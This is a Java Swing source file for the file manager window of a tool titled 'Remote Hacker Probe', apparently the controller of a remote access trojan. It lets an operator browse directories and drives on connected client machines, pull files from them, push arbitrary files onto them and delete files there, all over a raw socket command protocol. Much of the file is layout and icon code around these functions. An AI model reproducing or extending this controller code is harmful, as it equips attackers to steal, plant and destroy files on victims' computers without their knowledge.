package rhp;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.FlowLayout;

import javax.swing.DefaultListCellRenderer;
import javax.swing.DefaultListModel;
import javax.swing.Icon;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.border.EmptyBorder;
import javax.swing.filechooser.FileSystemView;

import org.apache.commons.io.FilenameUtils;

import java.awt.Font;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import javax.swing.JTextField;
import javax.swing.ListCellRenderer;
import javax.swing.JList;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;

import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.ActionEvent;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.JComboBox;


class IconRenderer extends DefaultListCellRenderer {
	
	String[] video_ext = {
			"mp4",
			"avi",
			"webm",
			"mpg",
			"mp2",
			"mpeg",
			"mpv",
			"ogg",
			"m4p",
			"m4v",
			"wmv",
			"mov",
			"qt",
			"flv",
			"swf",
			"avchd"
	};
	
	String[] image_ext = {
			"jpg",
			"png",
			"gif",
			"webp",
			"tiff",
			"psd",
			"raw",
			"bmp",
			"heif",
			"indd",
			"jpeg",
			"svg",
			"ai",
			"eps",
			"pdf",
			"svg",
			"JPG",
			"PNG"
	};
	
	String[] code_ext = {
			"asp",
			"aspx",
			"axd",
			"asx",
			"asmx",
			"ashx",
			"css",
			"cfm",
			"yaws",
			"swf",
			"html",
			"htm",
			"xhtml",
			"jhtml",
			"jsp",
			"jspx",
			"wss",
			"do",
			"action",
			"js",
			"pl",
			"php",
			"php4",
			"php3",
			"py",
			"rb",
			"rhtml",
			"shtml",
			"xml",
			"rss",
			"cgi",
			"cpp",
			"c",
			"java",
			"go",
			"bat",
			"ps",
			"pyc",
			"h",
			"hpp",
			"sln",
			"vcxproj",
			"vb",
			"swift"
	};
	
	String[] audio_ext = {
		"aif",
		"cda",
		"mid",
		"midi",
		"mp3",
		"mpa",
		"ogg",
		"wav",
		"wma",
		"wpl"
	};
	
	String[] cmp_ext = {
			"7z",
			"arj",
			"deb",
			"pkg",
			"rar",
			"rpm",
			"tar.gz",
			"z",
			"zip"
	};
	
	String[] exe_ext = {
			"apk",
			"bin",
			"cgi",
			"com",
			"exe",
			"gadget",
			"jar",
			"msi",
			"wsf"
	};
	
	String[] docs = {
		"doc",
		"docx",
		"pdf",
		"odt",
		"wpd",
		"pdf"
	};
	
	String[] txt = {
			"txt",
			"md",
			"ini",
			"cfg",
			"config",
			"text"
		};
        public Component getListCellRendererComponent(JList<? extends Object> list,Object value,int index,boolean isSelected,boolean cellHasFocus) {//Method of rewriting the renderer
                setText(" " + value.toString());
                setFont(new Font("Calibri", Font.PLAIN, 13));
                if(value.toString().replaceAll("\\s+", "").startsWith("(^)"))
                {
                	setIcon(new ImageIcon("icons/folder.png"));
                } else {
                	String filename = value.toString().split(" ")[0];
                	String ext = FilenameUtils.getExtension(filename);

                	if(Arrays.asList(video_ext).contains(ext))
                	{
                		setIcon(new ImageIcon("icons/files/023-video.png"));
                	} else if(Arrays.asList(image_ext).contains(ext)) 
                	{
                		setIcon(new ImageIcon("icons/files/025-image.png"));
                	}
                	else if(Arrays.asList(code_ext).contains(ext)) 
                	{
                		setIcon(new ImageIcon("icons/files/024-code.png"));
                	}
                	
                	else if(Arrays.asList(audio_ext).contains(ext)) 
                	{
                		setIcon(new ImageIcon("icons/files/021-audio.png"));
                	}
                	
                	else if(Arrays.asList(cmp_ext).contains(ext)) 
                	{
                		setIcon(new ImageIcon("icons/files/039-archive.png"));
                	}
                	
                	else if(Arrays.asList(exe_ext).contains(ext)) 
                	{
                		setIcon(new ImageIcon("icons/files/043-setting.png"));
                	}
                	
                	else if(Arrays.asList(docs).contains(ext)) 
                	{
                		setIcon(new ImageIcon("icons/files/040-user.png"));
                	}
                	else if(Arrays.asList(txt).contains(ext)) 
                	{
                		setIcon(new ImageIcon("icons/files/003-file.png"));
                	}
                	
                	
                	else {
                		setIcon(new ImageIcon("icons/files/001-file.png"));
                	}
                	
                }
                
       return this;
   }
}


public class FileManager extends JDialog {

	public final static JPanel contentPanel = new JPanel();
	static JList FileList;
	public int CLIENT_ID;
	public static JTextField textField;
	public static DefaultListModel model;
	public static List<String> driveslist = new ArrayList<String>();

	/**
	 * Create the dialog.
	 */
	void Refresh()
	{
		try {
			TimeUnit.SECONDS.sleep(1);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		Server.SendData(Server.Clients.get(CLIENT_ID), "listdir");
		ServerThread.WaitForReply();
	}

	
	public FileManager() {
		setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
		setTitle("Remote Hacker Probe | File Manager");
		setBounds(100, 100, 761, 410);
		getContentPane().setLayout(new BorderLayout());
		contentPanel.setBorder(new EmptyBorder(5, 5, 5, 5));
		getContentPane().add(contentPanel, BorderLayout.CENTER);
		
		JButton goBackbtn = new JButton("<");
		goBackbtn.setToolTipText("Go back");
		goBackbtn.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				Server.SendData(Server.Clients.get(CLIENT_ID), "cd");
				Server.SendData(Server.Clients.get(CLIENT_ID), "..");
				Refresh();
			}
		});
		goBackbtn.setFont(new Font("Calibri", Font.PLAIN, 12));
		
		textField = new JTextField();
		textField.setToolTipText("Current Directory path");
		textField.setFont(new Font("Consolas", Font.BOLD, 11));
		textField.setColumns(10);
		
		model = new DefaultListModel();
		FileList = new JList(model);
		FileList.setToolTipText("List of files and folders in current directory. Right click for more options.");
		FileList.setCellRenderer(new IconRenderer()); //Set the renderer to our own

		JScrollPane fscroll = new JScrollPane(FileList);
		
		JPopupMenu opts = new JPopupMenu(); 
		opts.setFont(new Font("Consolas", Font.BOLD, 11));
		JMenuItem dll = new JMenuItem(" Download", new ImageIcon("icons/010-download.png")); 
		dll.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				if(!FileList.isSelectionEmpty())
				{
					String File = (String) FileList.getSelectedValue();
					if(!File.startsWith("(^)")) {
						String filename = File.replaceAll("\\(.*?\\) ?", "");
						Server.SendData(Server.Clients.get(CLIENT_ID), "fupload:"+filename);
						ServerThread.WaitForReply();
					}
					
				}
			}
		});
		JMenuItem upl = new JMenuItem(" Upload", new ImageIcon("icons/047-upload.png")); 
		upl.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				JFileChooser filechooser = new JFileChooser();
				filechooser.showOpenDialog(null);
				File file = filechooser.getSelectedFile();
				int filesize = (int) file.length();

				String FileName = (String)JOptionPane.showInputDialog("Uploading : " + file.getName() + " of size " + String.valueOf(filesize) + " bytes.\nEnter File name to Save as : ");
				if(FileName.length() > 0) {
					byte[] file_buffer = new byte[filesize];
					Arrays.fill(file_buffer, (byte)0);
					int count = 0;
					DataOutputStream out = null;
					try {
						out = new DataOutputStream(Server.Clients.get(CLIENT_ID).getOutputStream());
					} catch (IOException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
					FileInputStream  in = null;
					try {
						in = new FileInputStream(file);

					} catch (FileNotFoundException e3) {
						// TODO Auto-generated catch block
						e3.printStackTrace();
					}
					
					MainWindow.HaltAllSystems();
					MainWindow.Log("File " + file + " is being uploaded. Please wait.");
					// Send File Save Trigger
					Server.SendData(Server.Clients.get(CLIENT_ID), "frecv");
					Server.SendData(Server.Clients.get(CLIENT_ID), FileName + ":" + String.valueOf(filesize));
					// Send the File!
					try {
						TimeUnit.SECONDS.sleep(1);
					} catch (InterruptedException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
					try {
						while ((count = in.read(file_buffer)) > 0) {
							out.write(file_buffer, 0, count);
						}
					} catch (IOException e2) {
						// TODO Auto-generated catch block
						e2.printStackTrace();
					}

					MainWindow.EnableAllSystems();
					MainWindow.Log("File '" + file + "' Uploaded, Wait for Message Box to confirm.");
					ServerThread.WaitForReply();
					Refresh();
				}
			}

		});
		JMenuItem del = new JMenuItem(" Delete", new ImageIcon("icons/045-trash.png")); 
		del.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				if(!FileList.isSelectionEmpty())
				{
					String File = (String) FileList.getSelectedValue();
					if(!File.startsWith("(^)")) {
						String filename = File.replaceAll("\\(.*?\\) ?", "");
						Server.SendData(Server.Clients.get(CLIENT_ID), "delete:"+filename);
						ServerThread.WaitForReply();
						Refresh();
					}
					
				}
			}
		});
		dll.setFont(new Font("Calibri", Font.PLAIN, 13));
		upl.setFont(new Font("Calibri", Font.PLAIN, 13));
		del.setFont(new Font("Calibri", Font.PLAIN, 13));
		opts.add(dll);
		opts.add(upl);
		opts.add(del);
		MainWindow.addPopup(FileList, opts);
		
		FileList.addMouseListener(new MouseAdapter() {
		    public void mouseClicked(MouseEvent evt) {
		        FileList = (JList)evt.getSource();
		        if (evt.getClickCount() == 2) {

		            // Double-click detected
		            String dir = (String) FileList.getSelectedValue();
		            if(dir.startsWith("(^)")) {
		            	String Dirname = dir.replace("(^) ", "");
		            	Server.SendData(Server.Clients.get(CLIENT_ID), "cd");
						Server.SendData(Server.Clients.get(CLIENT_ID), Dirname);
						Refresh();
		            }
		        } 
		    }
		});
		
		JButton refreshbtn = new JButton("Refresh");
		refreshbtn.setToolTipText("Refresh file list");
		refreshbtn.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				 Refresh();
			}
		});
		refreshbtn.setFont(new Font("Calibri", Font.PLAIN, 12));
		
		JButton btnGo = new JButton("Go");
		btnGo.setToolTipText("Go to Directory");
		btnGo.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String Dirname = textField.getText();
				Server.SendData(Server.Clients.get(CLIENT_ID), "cd");
				Server.SendData(Server.Clients.get(CLIENT_ID), Dirname);
				Refresh();
			}
		});
		btnGo.setFont(new Font("Calibri", Font.PLAIN, 12));
		
		String[] drives = new String[ driveslist.size() ];
		driveslist.toArray( drives );

		JComboBox comboBox = new JComboBox(drives);
		comboBox.setFont(new Font("Calibri", Font.PLAIN, 12));
		comboBox.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				int mode = comboBox.getSelectedIndex();
				String drivename = drives[mode];
				textField.setText(drivename);
				btnGo.doClick();
				
			}
		});
		GroupLayout gl_contentPanel = new GroupLayout(contentPanel);
		gl_contentPanel.setHorizontalGroup(
			gl_contentPanel.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPanel.createSequentialGroup()
					.addGap(5)
					.addGroup(gl_contentPanel.createParallelGroup(Alignment.LEADING)
						.addGroup(gl_contentPanel.createSequentialGroup()
							.addComponent(comboBox, 0, 75, Short.MAX_VALUE)
							.addGap(6)
							.addComponent(goBackbtn, GroupLayout.PREFERRED_SIZE, 46, GroupLayout.PREFERRED_SIZE)
							.addGap(6)
							.addComponent(textField, GroupLayout.DEFAULT_SIZE, 440, Short.MAX_VALUE)
							.addGap(10)
							.addComponent(btnGo, GroupLayout.DEFAULT_SIZE, 57, Short.MAX_VALUE)
							.addGap(10)
							.addComponent(refreshbtn, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
						.addComponent(fscroll, GroupLayout.DEFAULT_SIZE, 725, Short.MAX_VALUE))
					.addGap(5))
		);
		gl_contentPanel.setVerticalGroup(
			gl_contentPanel.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPanel.createSequentialGroup()
					.addGap(5)
					.addGroup(gl_contentPanel.createParallelGroup(Alignment.LEADING)
						.addGroup(gl_contentPanel.createSequentialGroup()
							.addGap(2)
							.addComponent(comboBox, GroupLayout.PREFERRED_SIZE, 23, GroupLayout.PREFERRED_SIZE))
						.addGroup(gl_contentPanel.createSequentialGroup()
							.addGap(2)
							.addComponent(goBackbtn, GroupLayout.PREFERRED_SIZE, 24, GroupLayout.PREFERRED_SIZE))
						.addGroup(gl_contentPanel.createSequentialGroup()
							.addGap(2)
							.addComponent(textField, GroupLayout.PREFERRED_SIZE, 24, GroupLayout.PREFERRED_SIZE))
						.addComponent(btnGo, GroupLayout.PREFERRED_SIZE, 24, GroupLayout.PREFERRED_SIZE)
						.addComponent(refreshbtn, GroupLayout.PREFERRED_SIZE, 24, GroupLayout.PREFERRED_SIZE))
					.addGap(9)
					.addComponent(fscroll, GroupLayout.DEFAULT_SIZE, 310, Short.MAX_VALUE)
					.addGap(11))
		);
		contentPanel.setLayout(gl_contentPanel);
		
		addWindowListener(new WindowAdapter() {
			@Override
		    public void windowOpened(WindowEvent we) {
		        Server.SendData(Server.Clients.get(CLIENT_ID), "listdir");
		    }
		});
	}
}
